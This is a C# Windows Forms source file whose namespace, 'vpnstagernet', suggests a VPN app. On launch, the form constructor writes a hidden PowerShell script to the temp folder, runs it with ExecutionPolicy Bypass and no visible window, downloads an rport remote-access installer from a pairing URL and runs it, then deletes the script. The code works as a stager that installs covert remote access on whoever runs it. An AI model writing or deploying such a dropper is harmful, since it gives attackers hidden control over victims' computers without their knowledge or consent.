using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace vpnstagernet
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            ExecutePowerShellCommand();
        }

        static void ExecutePowerShellCommand()
        {
            // Set the PowerShell script contents
            string scriptContents = @"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url='https://pairing.rport.io/eyAIQUt'
Invoke-WebRequest -Uri $url -OutFile 'rport-installer.ps1'
powershell -ExecutionPolicy Bypass -File .\rport-installer.ps1 -x -r -i
";

            // Create a temporary PowerShell script file
            string scriptFilePath = Path.Combine(Path.GetTempPath(), "temp.ps1");
            File.WriteAllText(scriptFilePath, scriptContents);

            // Start a new PowerShell process
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = $"-ExecutionPolicy Bypass -File \"{scriptFilePath}\""
            };

            Process process = new Process
            {
                StartInfo = psi
            };

            process.Start();
            process.WaitForExit();

            // Clean up the temporary script file
            File.Delete(scriptFilePath);

            // Handle the process output or errors if needed
            string output = process.StandardOutput.ReadToEnd();
            string errors = process.StandardError.ReadToEnd();

            // Display the output and errors in your application as needed
            Console.WriteLine(output);
            Console.WriteLine(errors);
        }
    }
}
